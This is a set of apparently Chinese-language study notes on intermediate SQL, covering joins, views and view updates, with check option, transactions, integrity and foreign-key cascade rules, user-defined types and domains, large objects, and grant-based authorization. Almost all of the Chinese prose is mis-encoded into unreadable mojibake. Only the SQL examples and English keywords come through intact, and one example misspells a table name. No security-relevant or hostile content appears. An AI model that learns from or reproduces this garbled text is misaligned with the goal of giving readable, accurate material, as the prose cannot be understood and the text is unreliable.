å¦‚æœä¸€ä¸ªå­¦ç”Ÿæ²¡æœ‰æˆåŠŸå­¦å®Œä»»ä½•ä¸€ä¸ªè¯¾ç¨‹ï¼Œåˆ™å°†å…¶tot_creds å±æ€§è®¾ä¸ºç©º # ä¸ä½¿ç”¨sum(credits)ï¼Œè€Œæ˜¯ä½¿ç”¨: \tcase when\tsum(credits) is not null then sum(credits) else 0 end   ä¸­çº§SQL è¿æ¥è¡¨è¾¾å¼ è¿æ¥å…³ç³» è¿æ¥æ“ä½œä½œç”¨äºä¸¤ä¸ªå…³ç³»å¹¶è¿”å›ä¸€ä¸ªå…³ç³»ä½œä¸ºç»“æœ\nä¸€ä¸ªè¿æ¥æ“ä½œæ˜¯ä¸€ä¸ªç¬›å¡å„¿ç§¯ï¼Œå¹¶ä¸”è¦æ±‚ä¸¤ä¸ªå…³ç³»çš„å…ƒç»„æ»¡è¶³æŸäº›åŒ¹é…æ¡ä»¶ï¼Œä»–è¿˜æŒ‡å®šåœ¨è¿æ¥ç»“æœä¸­è¦å‡ºç°çš„å±æ€§\njoinæ“ä½œé€šå¸¸ç”¨ä½œfromå­å¥ä¸­çš„å­æŸ¥è¯¢è¡¨è¾¾å¼\nå¤–è¿æ¥   ä¸€ä¸ªæ‰©å±•çš„è¿æ¥æ“ä½œï¼Œé¿å…äº†ä¿¡æ¯çš„æŸå¤±\n  è®¡ç®—joinï¼Œç„¶åå°†ä¸€ä¸ªå…³ç³»ä¸­ä¸å¦ä¸€ä¸ªä¸åŒ¹é…çš„å…ƒç»„æ·»åŠ åˆ°ç»“æœä¸­\n  ä½¿ç”¨nullå€¼\n  å¯¹äºè¯¥å…³ç³»ï¼Œæˆ‘ä»¬æœ‰å·¦å¤–è¿æ¥ã€å³å¤–è¿æ¥ã€å…¨å¤–è¿æ¥å’Œå†…è¿æ¥\nå·¦å¤–è¿æ¥å¦‚ä¸‹ï¼š\nå³å¤–è¿æ¥å¦‚ä¸‹ï¼š\nç®€è€Œè¨€ä¹‹ï¼Œå¾€å“ªè¿æ¥ï¼Œè¢«è¿æ¥çš„è¡¨çš„ä¸»ç å…¨éƒ¨éœ€è¦ä¿ç•™ï¼Œç„¶åå°†å…¶è¿æ¥çš„å±æ€§æœ‰åˆ™å¡«å…¥ï¼Œæ— åˆ™èµ‹null\nè‹¥æ‰¾ä¸åˆ°ç›¸åº”çš„ä¸»ç ï¼Œåˆ™å°†è¿æ¥çš„è¡¨çš„é‚£ä¸€è¡Œä¸¢å¼ƒ\nå…¨å¤–è¿æ¥å¦‚ä¸‹ï¼š\n è¿æ¥æ“ä½œå°†ä¸¤ä¸ªå…³ç³»ä½œä¸ºè¾“å…¥ï¼Œè¿”å›ä¸€ä¸ªå…³ç³»ä½œä¸ºç»“æœ è¿æ¥æ¡ä»¶ï¼šè§„å®šäº†è¿™ä¸¤ä¸ªå…³ç³»ä¸­çš„å“ªäº›å…ƒç»„åŒ¹é…ï¼Œä»¥åŠåœ¨è¿æ¥ç»“æœä¸­å‡ºç°äº†ä»€ä¹ˆå±æ€§ è¿æ¥ç±»å‹ï¼šè§„å®šäº†å¯¹æ¯ä¸ªå…³ç³»ä¸­ï¼ˆåŸºäºè¿æ¥æ¡ä»¶ï¼‰ä¸ä¸å…¶ä»–å…³ç³»ä¸­çš„å…ƒç»„ç›¸åŒ¹é…çš„å…ƒç»„æ€æ ·å¤„ç†  å¯¹äºè‡ªç„¶è¿æ¥ï¼Œä¼šè‡ªåŠ¨åˆå¹¶ç›¸åŒçš„åˆ—ï¼Œä½†æ˜¯è¿æ¥ä¼šä¿ç•™åˆ—\nä¾‹å­å¦‚ä¸‹ï¼š\nè§†å›¾ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè®©æ‰€æœ‰çš„ç”¨æˆ·çœ‹åˆ°æ•´ä¸ªé€»è¾‘æ¨¡å‹ï¼ˆå³æ‰€æœ‰å®é™…å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„å…³ç³»ï¼‰æ˜¯ä¸å¯å–çš„\nè§†å›¾æä¾›ä¸€ä¸ªå¯¹æŸäº›ç”¨æˆ·ä»è§†å›¾ä¸­éšè—æŸäº›æ•°æ®çš„æœºåˆ¶\nä»»ä½•ä¸æ˜¯é€»è¾‘æ¨¡å‹çš„ä¸€éƒ¨åˆ†ï¼Œä½†ä½œä¸ºè™šå…³ç³»å¯¹ç”¨æˆ·å¯è§çš„å…³ç³»ç§°ä¸ºè§†å›¾ã€‚\nå®šä¹‰ 1  create\tview\tv\tas\t\u003cquery expression\u003e   å…¶ä¸­ï¼Œ\u003cquery expression\u003eå¯ä»¥æ˜¯ä»»ä½•åˆæ³•çš„SQLè¡¨è¾¾å¼ï¼Œvè¡¨ç¤ºè§†å›¾å\nä¸€æ—¦å®šä¹‰äº†ä¸€ä¸ªè§†å›¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨è§†å›¾æŒ‡ä»£è¯¥è§†å›¾ç”Ÿæˆçš„è™šå…³ç³»\nå®šä¹‰è§†å›¾æ—¶å¹¶ä¸æ˜¯ç”±æŸ¥è¯¢è¡¨è¾¾å¼çš„æ‰§è¡Œç»“æœåˆ›é€ ä¸€ä¸ªæ–°å…³ç³»ï¼Œç›¸åï¼Œä¸€ä¸ªè§†å›¾çš„å®šä¹‰å¯¼è‡´å­˜å‚¨ä¸€ä¸ªæŸ¥è¯¢è¡¨è¾¾å¼ï¼Œå½“è¯¥è§†å›¾è¢«ä½¿ç”¨æ—¶ï¼Œä»–å°±è¢«è¿™ä¸ªå·²å­˜å‚¨çš„æŸ¥è¯¢è¡¨è¾¾å¼æ›¿æ¢ï¼ˆæœ‰ç‚¹ç±»ä¼¼C++çš„å®å®šä¹‰ï¼‰\nç‰¹ç‚¹  è™šè¡¨ï¼Œæ˜¯ä»ä¸€ä¸ªæˆ–å‡ ä¸ªåŸºæœ¬è¡¨ï¼ˆæˆ–è§†å›¾ï¼‰å¯¼å‡ºçš„å…³ç³» åªå­˜æ”¾è§†å›¾çš„å®šä¹‰ï¼Œä¸ä¼šå‡ºç°æ•°æ®å†—ä½™ åŸºè¡¨ä¸­çš„æ•°æ®å‘ç”Ÿå˜åŒ–ï¼Œä»è§†å›¾ä¸­æŸ¥è¯¢çš„æ•°æ®ä¹Ÿéšä¹‹æ”¹å˜ æŸ¥è¯¢æ—¶ï¼Œè§†å›¾åå¯ä»¥å‡ºç°åœ¨ä»»ä½•å…³ç³»åå¯ä»¥å‡ºç°çš„åœ°æ–¹  å¯¹æ¯”  è§†å›¾(view) vs æ´¾ç”ŸæŸ¥è¯¢(with)ï¼š  è§†å›¾å­˜å‚¨åœ¨DBæ•°æ®å­—å…¸ä¸­ï¼Œæ˜¯æ•°æ®åº“æ¨¡å¼çš„ä¸€éƒ¨åˆ† withå®šä¹‰çš„æ´¾ç”Ÿå…³ç³»ï¼Œä»…åœ¨æ‰€å±çš„SQLæœ‰æ•ˆï¼Œä¸å±äºDBæ¨¡å¼   è§†å›¾(view) vs è¡¨(table)ï¼š  è§†å›¾å’Œè¡¨éƒ½æ˜¯å…³ç³»ï¼Œéƒ½å¯ä»¥åœ¨SQLä¸­ç›´æ¥åº”ç”¨ DBä¸­å­˜å‚¨è¡¨çš„æ¨¡å¼å®šä¹‰å’Œæ•°æ® DBä¸­å€¼å­˜å‚¨è§†å›¾çš„å®šä¹‰ï¼Œä¸å­˜è§†å›¾çš„æ•°æ® è§†å›¾æ•°æ®å®åœ¨ä½¿ç”¨è§†å›¾æ—¶ä¸´æ—¶è®¡ç®—çš„ ç‰©åŒ–è§†å›¾æ˜¯æé«˜è®¡ç®—çš„ä¸€ç§æ‰‹æ®µï¼Œç»“æœç­‰ä»·äºä¸´æ—¶è®¡ç®—   è§†å›¾çš„ä½œç”¨ï¼š  å¯¹å¤–æ¨¡å¼çš„æ”¯æŒ å®‰å…¨æ€§ã€æ–¹ä¾¿æ€§    1 2 3 4 5 6 7 8 9 10 11  # ä¾‹ # instructorå…³ç³»çš„æ²¡æœ‰salaryçš„å±æ€§è§†å›¾ create\tview\tfaculty\tas select\tID,name,dept_name from\tinstructor # æ‰¾å‡ºBiologyç³»çš„æ‰€æœ‰æ•™å¸ˆçš„å§“å select name from faculty where\tdept_name = 'Biology'    è§†å›¾çš„å±æ€§åç¼ºçœä¸ºå­æŸ¥è¯¢ç»“æœä¸­çš„å±æ€§åï¼Œä¹Ÿå¯ä»¥æ˜¯æ˜¾å¼æŒ‡æ˜ï¼Œåœ¨ä¸‹åˆ—æƒ…å†µä¸‹ï¼Œå¿…é¡»æŒ‡æ˜è§†å›¾çš„æ‰€æœ‰åˆ—åï¼š  æŸä¸ªç›®æ ‡åˆ—å¼èšé›†å‡½æ•°æˆ–åˆ—è¡¨è¾¾å¼ å¤šè¡¨è¿æ¥æ—¶ï¼Œé€‰å‡ºäº†å‡ ä¸ªåŒååˆ—ä½œä¸ºè§†å›¾çš„å­—æ®µ éœ€è¦åœ¨è§†å›¾ä¸­ä¸ºæŸä¸ªåˆ—å¯ç”¨æ–°çš„æ›´åˆé€‚çš„åå­— ç›®æ ‡åˆ—æ˜¯*    1 2 3 4 5 6 7 8  # ä¾‹ # å®šä¹‰ä¸€ä¸ªæ¯ä¸ªç³»çš„å·¥èµ„æ€»å’Œçš„è§†å›¾ create view\tdepartments_total_salary(dept_name, total_salary) as select\tdept_name, sum(salary) from\tinstructor group by dept_name   ä½¿ç”¨å…¶ä»–è§†å›¾å®šä¹‰è§†å›¾ ä¸€ä¸ªè§†å›¾å¯ä»¥ç”¨äºå®šä¹‰å¦ä¸€ä¸ªè§†å›¾çš„è¡¨è¾¾å¼ä¸­\nå¦‚æœä¸€ä¸ªè§†å›¾å…³ç³»v2ç”¨äºå®šä¹‰å¦ä¸€ä¸ªè§†å›¾å…³ç³»v1çš„è¡¨è¾¾å¼ä¸­ï¼Œåˆ™ç§°v1ç›´æ¥ä¾èµ–äºv2\nå¦‚æœä¸€ä¸ªè§†å›¾å…³ç³»v1ç›´æ¥ä¾èµ–äºå¦ä¸€ä¸ªè§†å›¾v2ï¼Œæˆ–é€šè¿‡å…¶ä»–è§†å›¾é—´æ¥ä¾èµ–äºv2ï¼Œåˆ™ç§°v1ä¾èµ–äºv2\nä¸€ä¸ªè§†å›¾å…³ç³»å¦‚æœä¾èµ–äºå®ƒè‡ªèº«ï¼Œåˆ™è¢«ç§°ä¸ºé€’å½’çš„\nè§†å›¾æ‰©å±• ä¸€ç§é€šè¿‡å…¶ä»–è§†å›¾çš„å®šä¹‰æ¥å®šä¹‰è§†å›¾å«ä¹‰çš„æ–¹æ³•\nè®¾è§†å›¾v1ç”±è¡¨è¾¾å¼e1å®šä¹‰çš„ï¼Œå¯èƒ½å®ƒæœ¬èº«å°±åŒ…å«å¯¹è§†å›¾å…³ç³»çš„ä½¿ç”¨\nä¸€ä¸ªè¡¨è¾¾å¼ä¸­çš„è§†å›¾æ‰©å±•é‡å¤ä»¥ä¸‹æ›¿æ¢æ­¥éª¤\n repeat æ‰¾åˆ°e1ä¸­çš„å…³ç³»vi ä½¿ç”¨å®šä¹‰viçš„è¡¨è¾¾å¼æ›¿æ¢vi until\tåœ¨e1ä¸­æ²¡æœ‰è§†å›¾å…³ç³»  æ˜¯è¦è§†å›¾ä¸æ˜¯é€’å½’çš„ï¼Œå¾ªç¯å°±èƒ½ç»ˆæ­¢\nè§†å›¾æ›´æ–° 1 2 3 4 5 6  update\tview_name set\tcol = val where\texpression delete\tfrom\tview_name where\texpression   è§†å›¾çš„æ›´æ–°å°±æ˜¯è½¬æ¢ä¸ºè¡¨çš„æ›´æ–°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  # ä¾‹ create\tview\tIS_Student\tas select\tSno,Sname,Sage from\tStudent where\tSdept = 'IS'; #update update\tIS_Student set\tSname = 'Alice' where\tSno = '12315' #transferTo update\tStudent set Sname = 'Alice' where\tSno = '12315'\tand\tSdept = 'IS'; #insert insert\tinto\tIS_Student values('12306', 'Bob', 18) #transferTo insert\tinto\tStudnet(Sno,Sname,Sage,Sdept) values('12306','Bob',18,'IS') #delete delete\tfrom\tIS_Student where\tSno = '12315' #transferTo delete\tfrom Student where\tSno = '12315'\tand\tSdept = 'IS'   æœ‰äº›æ›´æ–°ä¸èƒ½è¢«å•ç‹¬æ‰§è¡Œï¼Œå¤§éƒ¨åˆ†çš„SQLå®ç°åªå…è®¸åœ¨ç®€å•è§†å›¾ä¸Šçš„æ›´æ–°ï¼ˆâ‘ fromå­å¥ä¸­åªæœ‰ä¸€ä¸ªæ•°æ®åº“å…³ç³»ï¼›â‘¡selectå­å¥ä¸­åªåŒ…å«å…³ç³»çš„å±æ€§åï¼Œä¸åŒ…å«ä»»ä½•è¡¨è¾¾å¼ã€èšé›†å‡½æ•°æˆ–distinctå£°æ˜ï¼›â‘¢ä»»ä½•æ²¡æœ‰å‡ºç°selectå­å¥ä¸­çš„å±æ€§å¯ä»¥å–ç©ºå€¼ï¼›â‘£æŸ¥è¯¢ä¸­ä¸å«æœ‰group byæˆ–havingå­å¥ï¼‰\nå¯¹äºè¡Œåˆ—å­é›†è§†å›¾å¯ä»¥æ›´æ–°\nwith check option  è§†å›¾å®šä¹‰æ—¶ï¼ŒæŒ‡å®šwith check optionï¼Œå¼ºåˆ¶é€šè¿‡è§†å›¾è¿›è¡Œçš„ä¿®æ”¹ï¼Œç»“æœå¿…é¡»åœ¨è§†å›¾ä¸­ã€‚  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  # ä¾‹ ''' Sno\tSname\tSage\tDept S1\tA\t21\tC S4\tB\t20\tC S2\tC\t19\tS s3\tD\t21\tS ''' create\tview sv1\tas select\tsno,sname,sage\tfrom\ts where\tDept = 'C'\tand\tsage\u003e20 update\tsv1\tset\tsage=19\twhere\tsno = 's4' # æ›´ä»¥æ›´æ–°,æ›´æ–°å,Bä¸å†å‡ºç°åœ¨è§†å›¾ä¸­  create\tview sv1\tas select\tsno,sname,sage\tfrom\ts where\tDept = 'C'\tand\tsage\u003e20 with check\toption; update\tsv1\tset\tsage=19\twhere\tsno = 's4' # ä¸å¯ä»¥æ›´æ–°,updateè¯­å¥å°†è¢«DBMSæ‹’ç»    ç‰©åŒ–è§†å›¾ å®šä¹‰ï¼šåˆ›å»ºä¸€ä¸ªç‰©ç†è¡¨ï¼Œæ­¤è¡¨åŒ…å«å®šä¹‰è§†å›¾çš„æŸ¥è¯¢ç»“æœçš„æ‰€æœ‰å…ƒç»„\nå¦‚æœæŸ¥è¯¢ä¸­ä½¿ç”¨çš„å…³ç³»å‘ç”Ÿäº†æ›´æ–°ï¼Œåˆ™ç‰©åŒ–è§†å›¾ä¸­çš„ç»“æœå°±ä¼šè¿‡æœŸ\næ¯å½“è§†å›¾çš„åº•å±‚å…³ç³»è¿›è¡Œæ›´æ–°æ—¶è¦æ›´æ–°è§†å›¾ï¼Œä»¥æ­¤ç»´æŠ¤è§†å›¾\näº‹åŠ¡  å·¥ä½œå•å…ƒ åŸå­äº‹åŠ¡ï¼šè¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆå›æ»šï¼Œå¥½åƒæ²¡æœ‰å‘ç”Ÿä¸€æ · ä»å¹¶å‘äº‹åŠ¡ä¸­éš”ç¦» éšå¼åœ°å¼€å§‹ä¸€ä¸ªä»»åŠ¡  ä»¥commit\twork\tæˆ–\trollback\tworkç»“æŸ   å¤šæ•°æ•°æ®åº“çš„é»˜è®¤æƒ…å†µï¼šæ¯ä¸ªSQLè¯­å¥è‡ªåŠ¨æäº¤  å¯ä»¥å…³é—­è‡ªåŠ¨æäº¤äº†ä¸€ä¸ªä¼šè¯ åœ¨SQL:1999é‡Œå¯ä»¥ä½¿ç”¨begin atomic ... endï¼ˆä½†è¿™ç§æ–¹å¼ä¸è¢«å¤šæ•°æ•°æ®åº“æ”¯æŒï¼‰    å®Œæ•´æ€§çº¦æŸ  å®Œæ•´æ€§çº¦æŸé€šè¿‡ä¿è¯å¯¹æ•°æ®åº“çš„ä¿®æ”¹ä¸ä¼šé€ æˆæ•°æ®çš„ä¸ä¸€è‡´ï¼Œæ¥é˜²æ­¢å¯¹æ•°æ®åº“æ•°æ®çš„æ„å¤–ç ´å   å•ä¸ªå…³ç³»ä¸Šçš„çº¦æŸ\n not nullï¼šæŒ‡å®šçš„å±æ€§ä¸Šï¼Œä¸å…è®¸å‡ºç°ç©ºå€¼  é™åˆ¶ï¼šä»»ä½•è¯•å›¾å¯¼è‡´æŸä¸ªæˆ–æŸäº›å…ƒç»„éç©ºå±æ€§ä¸ºç©ºçš„æ“ä½œéƒ½å°†è¢«æ‹’ç»   primary keyï¼šå£°æ˜ä¸ºä¸»ç   ä¸»ç å€¼ä¸å…è®¸ä¸ºç©ºï¼Œä¹Ÿä¸å…è®¸å‡ºç°é‡å¤ æ„ä¹‰ï¼šå…³ç³»å¯¹åº”åˆ°ç°å®ä¸–ç•Œä¸­çš„å®ä½“é›†ï¼Œå…ƒç»„å¯¹åº”åˆ°å®ä½“ï¼Œå®ä½“æ˜¯ç›¸äº’å¯åŒºåˆ†çš„ï¼Œé€šè¿‡ä¸»ç æ¥å”¯ä¸€æ ‡è¯†ï¼Œè‹¥ä¸»ç ä¸ºç©ºï¼Œåˆ™å‡ºç°ä¸å¯æ ‡è¯†çš„å®ä½“ï¼Œè¿™æ˜¯ä¸å®¹è®¸çš„   uniqueï¼šå£°æ˜å€™é€‰ç   çº¦æŸï¼šä¸å…è®¸å…³ç³»ä¸­ï¼Œæœ‰ä¸¤ä¸ªå…ƒç»„åœ¨æŒ‡å®šå±æ€§ä¸Šå–å€¼ç›¸åŒ uniqueæœ¬èº«ä¸é™å®šå±æ€§éç©º   check(P)ï¼ŒPæ˜¯ä¸€ä¸ªè°“è¯  çº¦æŸï¼šå…³ç³»ä¸Šçš„æ¯ä¸€ä¸ªå…ƒç»„ï¼Œéƒ½å¿…é¡»æ»¡è¶³P checkå¯ä»¥é’ˆå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªå±æ€§ checkå¯ä»¥æ¶‰åŠå…¶ä»–è¡¨ï¼Œä½†éœ€è€ƒè™‘çº¦æŸæ£€æŸ¥æ¡ä»¶ä»£ä»·     å¯¹äºcheckï¼Œæˆ‘ä»¬æœ‰\n1 2 3 4 5 6 7 8 9 10 11 12  # ä¿è¯semesterå¿…é¡»æ˜¯å››å­£å³Spring,Summer,Fall,Winterä¸­çš„ä¸€ä¸ª create table section ( course_id varchar (8), sec_id varchar (8), semester varchar (6), year numeric (4,0), building varchar (15), room_number varchar (7), time slot id varchar (4), primary key (course_id, sec_id, semester, year), check (semester in(â€˜Fallâ€™,â€˜Winterâ€™,â€˜Springâ€™,â€˜Summerâ€™))   å‚ç…§å®Œæ•´æ€§ ä¿è¯åœ¨ä¸€ä¸ªå…³ç³»ä¸­ç»™å®šå±æ€§é›†ä¸Šçš„å–å€¼ä¹Ÿåœ¨å¦ä¸€å…³ç³»çš„ç‰¹å®šå±æ€§é›†çš„å–å€¼ä¸­å‡ºç°\nAæ˜¯ä¸€ä¸ªå±æ€§çš„é›†åˆï¼ŒRå’ŒSæ˜¯ä¸¤ä¸ªåŒ…å«å±æ€§Açš„å…³ç³»ï¼Œå¹¶ä¸”Aæ˜¯Sçš„ä¸»ç ï¼Œå¦‚æœå¯¹äºæ¯ä¸ªè€Œåœ¨Rä¸­å‡ºç°çš„Aåœ¨Sä¸­ä¹Ÿå‡ºç°ï¼Œåˆ™Aè¢«ç§°ä¸ºRçš„å¤–ç \nå‚ç…§å®Œæ•´æ€§çš„çº§è”è¡Œä¸º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # å‚ç…§å®Œæ•´æ€§ä¸­çš„çº§è”è¡Œä¸º create table course ( course_id\tchar(5) primary key, title\tvarchar(20), dept_name\tvarchar(20) references department) create table course ( â€¦ dept_name varchar(20), foreign key (dept_name) references department on delete cascade on update cascade, . . . ) # çº§è”è¡Œä¸ºçš„æ›¿ä»£æ–¹å¼: set null,set default    åˆ é™¤åŸºæœ¬å…³ç³»å…ƒç»„  Restrictæ–¹å¼ï¼šåªæœ‰å½“ä¾èµ–å…³ç³»ä¸­æ²¡æœ‰ä¸€ä¸ªå¤–ç å€¼ä¸è¦åˆ é™¤çš„åŸºæœ¬å…³ç³»çš„ä¸»ç å€¼ç›¸å¯¹åº”æ—¶ï¼Œæ‰å¯ä»¥åˆ é™¤è¯¥å…ƒç»„ï¼Œå¦åˆ™ç³»ç»Ÿæ‹’ç»æ­¤åˆ é™¤æ“ä½œ Cascadeæ–¹å¼ï¼šå°†ä¾èµ–å…³ç³»ä¸­æ‰€æœ‰å¤–ç å€¼ä¸åŸºæœ¬å…³ç³»ä¸­è¦åˆ é™¤çš„ä¸»ç å€¼æ‰€å¯¹åº”çš„å…ƒç»„ä¸€èµ·åˆ é™¤ Set nullæ–¹å¼ï¼šåˆ é™¤åŸºæœ¬å…³ç³»ä¸­å…ƒç»„æ—¶ï¼Œå°†ä¾èµ–å…³ç³»ä¸­ä¸åŸºæœ¬å…³ç³»ä¸­è¢«åˆ ä¸»ç å€¼ç›¸å¯¹åº”çš„å¤–ç å€¼ç½®ä¸ºç©ºå€¼    1  Foreign\tkey\t(Sno)\tReferences\tS(Sno)\t[on\tdelete\t[cascade|set null]]    ä¿®æ”¹åŸºæœ¬å…³ç³»å…ƒç»„  Restrictæ–¹å¼ï¼šåªæœ‰å½“ä¾èµ–å…³ç³»ä¸­æ²¡æœ‰ä¸€ä¸ªå¤–ç å€¼ä¸è¦ä¿®æ”¹çš„åŸºæœ¬å…³ç³»çš„ä¸»ç å€¼ç›¸å¯¹åº”æ—¶ï¼Œæ‰å¯ä»¥ä¿®æ”¹è¯¥å…ƒç»„ä¸»ç ï¼Œå¦åˆ™ç³»ç»Ÿæ‹’ç»æ­¤æ¬¡ä¿®æ”¹ Cascadeæ–¹å¼ï¼šå°†ä¾èµ–å…³ç³»ä¸­æ‰€æœ‰ä¸åŸºæœ¬å…³ç³»ä¸­è¦ä¿®æ”¹çš„ä¸»ç å€¼æ‰€å¯¹åº”çš„å¤–ç å€¼ä¸€èµ·ä¿®æ”¹ä¸ºæ–°å€¼ Set nullæ–¹å¼ï¼šä¿®æ”¹åŸºæœ¬å…³ç³»ä¸­å…ƒç»„ä¸»ç æ—¶ï¼Œå°†ä¾èµ–å…³ç³»ä¸­ä¸åŸºæœ¬å…³ç³»ä¸­è¢«ä¿®æ”¹ä¸»ç å€¼ç›¸å¯¹åº”çš„å¤–ç å€¼ç½®ä¸ºç©ºå€¼    1  Foreign\tkey\t(Sno)\tReferences\tS(Sno)\t[on\tupdate\t[cascade|set null]]   å¤æ‚checkå­å¥ 1  create\tassertion\t\u003cassertion-name\u003e\tcheck\t\u003cpredicate\u003e   SQLçš„æ•°æ®ç±»å‹ä¸æ¨¡å¼ SQLå›ºæœ‰çš„æ•°æ®ç±»å‹  dateï¼šæ—¥æœŸï¼ŒåŒ…æ‹¬å¹´(å››ä½)ã€æœˆã€æ—¥ï¼Œå¦‚date '2005-7-27' timeï¼šæ—¶é—´ï¼ŒåŒ…æ‹¬å°æ—¶ã€åˆ†ã€ç§’ï¼Œå¦‚time '09:00:30'ï¼Œtime '09:00:30.75' timestampï¼šdateå’Œtimeçš„ç»„åˆï¼Œå¦‚timestamp '2005-7-27 09:00:30.75' intervalï¼šæ—¶é—´æ®µï¼Œå¦‚interval '1' day  ä¸¤ä¸ª date/time/timestamp ç±»å‹å€¼ç›¸å‡äº§ç”Ÿä¸€ä¸ª interval ç±»å‹å€¼ å¯ä»¥åœ¨ date/time/timestamp ç±»å‹çš„å€¼ä¸ŠåŠ å‡ interval ç±»å‹çš„å€¼    ç”¨æˆ·å®šä¹‰çš„ç±»å‹ SQLä¸­çš„create typeç»“æ„åˆ›å»ºç”¨æˆ·å®šä¹‰çš„ç±»å‹\n1 2 3 4 5 6 7 8  # ä¾‹ create type\tDollars\tas numeric(12,2)\tfinal create\ttable\tdepartment( dept_name\tvarchar(20), building\tvarchar(15), budget\tDollars );   SQL-92ä¸­çš„create domainç»“æ„åˆ›å»ºç”¨æˆ·å®šä¹‰çš„åŸŸç±»å‹\n1 2 3 4 5  create\tdomain\tperson_name\tchar(20)\tnot null create domain\tdegree_level\tvarchar(10) constraint\tdegree_level_test check(value in ('Bachelors','Masters','Doctorate'))   ç±»å‹å’ŒåŸŸç›¸ä¼¼ï¼Œä½†æ˜¯åŸŸæœ¬èº«å¯ä»¥æŒ‡å®šçº¦æŸï¼Œæ¯”å¦‚not null\n  ç”¨æˆ·å®šä¹‰ç±»å‹\n ç‹¬ç‰¹ç±»å‹ï¼šdistinct typeï¼šcreate type Dollars as numeric(12,2) ç»“æ„åŒ–ï¼šstructuredï¼šcreate type person(pid char(18),name varchar(8)) ç”¨æˆ·å®šä¹‰ç±»å‹ï¼Œæœ¬è´¨ä¸Šæ˜¯å¯¹RDBçš„é¢å‘å¯¹è±¡æ‰©å±•    ç”¨æˆ·å®šä¹‰åŸŸï¼šcreate domain Dollar as numeric(12,2)\n è‡ªå®šä¹‰åŸŸä¸æ”¯æŒç»“æ„    Type vs Domain\n Typeï¼šè¿›è¡Œå¼ºç±»å‹æ£€æŸ¥ Domainï¼šä¸è¿›è¡Œå¼ºç±»å‹æ£€æŸ¥ï¼Œæ”¯æŒå¼ºåˆ¶ç±»å‹è½¬æ¢ Typeç”±ä¸¥æ ¼çš„OOç†è®ºåŸºç¡€ï¼ŒDomainæ—¶çº¯RDBçš„æ¦‚å¿µ    å¤§å¯¹è±¡ç±»å‹ å¤§å¯¹è±¡ç±»å‹ï¼ˆç…§ç‰‡ã€è§†é¢‘ã€CADæ–‡ä»¶ç­‰ï¼‰ä»¥large objectç±»å‹å­˜å‚¨\n blobï¼šäºŒè¿›åˆ¶æ•°æ®çš„å¤§å¯¹è±¡æ•°æ®ç±»å‹â€”â€”å¯¹è±¡æ˜¯æ²¡æœ‰è¢«è§£é‡Šçš„äºŒè¿›åˆ¶æ•°æ®çš„å¤§é›†åˆï¼ˆå¯¹äºŒè¿›åˆ¶æ•°æ®çš„è§£é‡Šç”±æ•°æ®åº“ç³»ç»Ÿä»¥å¤–çš„åº”ç”¨ç¨‹åºå®Œæˆï¼‰ clobï¼šå­—ç¬¦æ•°æ®çš„å¤§å¯¹è±¡æ•°æ®ç±»å‹â€”â€”å¯¹è±¡æ˜¯å­—ç¬¦æ•°æ®çš„å¤§é›†åˆ  å½“æŸ¥è¯¢ç»“æœæ˜¯ä¸€ä¸ªå¤§å¯¹è±¡æ—¶ï¼Œè¿”å›çš„æ˜¯æŒ‡å‘è¿™ä¸ªå¤§å¯¹è±¡çš„æŒ‡é’ˆï¼Œè€Œä¸æ˜¯å¤§å¯¹è±¡æœ¬èº«\nLOBï¼šLarge OBjectï¼Œç”¨äºå­˜å‚¨å¤§ç©ºé—´çš„å€¼ï¼Œå­˜å‚¨ç”±æŒ‡é’ˆåŠ æ–‡ä»¶å®ç°\nLOBè®¿é—®ï¼šä¸€èˆ¬ä½¿ç”¨ä¸“ç”¨è¯­å¥è®¿é—®\n1 2 3 4  # Oracle select Blob doc into ... from\tbook where cno = 'c1'   æˆæƒ æƒé™çš„è½¬æˆå’Œå›æ”¶ å…è®¸ç”¨æˆ·æŠŠå·²è·å¾—çš„æƒé™è½¬æˆç»™å…¶ä»–ç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥æŠŠå·²æˆç»™å…¶ä»–ç”¨æˆ·çš„æƒé™åœ¨å›æ”¶ä¸Šæ¥\næƒé™å›¾ èŠ‚ç‚¹æ˜¯ç”¨æˆ·ï¼Œæ ¹èŠ‚ç‚¹æ˜¯DBAï¼Œæœ‰å‘è¾¹Ui â†’ Uj ï¼Œè¡¨ç¤ºç”¨æˆ·Ui æŠŠæŸæƒé™æˆç»™ç”¨æˆ·Uj\nä¸€ä¸ªç”¨æˆ·æ‹¥æœ‰æƒé™çš„å……åˆ†å¿…è¦æ¡ä»¶æ˜¯åœ¨æƒé™å›¾æœ‰ä¸€æ¡ä»æ ¹èŠ‚ç‚¹åˆ°è¯¥ç”¨æˆ·èŠ‚ç‚¹çš„è·¯å¾„\næ•°æ®åº“æŸäº›éƒ¨åˆ†çš„å‡ ç§æˆæƒå½¢å¼ï¼š\n Readï¼šå…è®¸è¯»å–ï¼Œä½†æ˜¯ä¸èƒ½ä¿®æ”¹æ•°æ® Insertï¼šå…è®¸æ’å…¥æ–°æ•°æ®ï¼Œä½†æ˜¯ä¸èƒ½ä¿®æ”¹å·²æœ‰çš„æ•°æ® Updateï¼šå…è®¸ä¿®æ”¹ï¼Œä½†æ˜¯ä¸èƒ½åˆ é™¤æ•°æ® Deleteï¼šå…è®¸åˆ é™¤æ•°æ®  ä¿®æ”¹æ•°æ®åº“æ¨¡å¼çš„å‡ ç§æˆæƒå½¢å¼ï¼š\n Indexï¼šå…è®¸åˆ›å»ºå’Œåˆ é™¤ç´¢å¼• Resourcesï¼šå…è®¸åˆ›å»ºæ–°çš„å…³ç³» Alterationï¼šå…è®¸å¢åŠ æˆ–åˆ é™¤å…³ç³»çš„å±æ€§ Dropï¼šå…è®¸åˆ é™¤å…³ç³»  SQLä¸­çš„æˆæƒè§„èŒƒ grantè¯­å¥ç”¨äºæˆäºˆæƒé™\n1 2  grant\t\u003cæƒé™åˆ—è¡¨\u003e on\t\u003cå…³ç³»å|è§†å›¾å\u003e to \u003cç”¨æˆ·|è§’è‰²åˆ—è¡¨\u003e   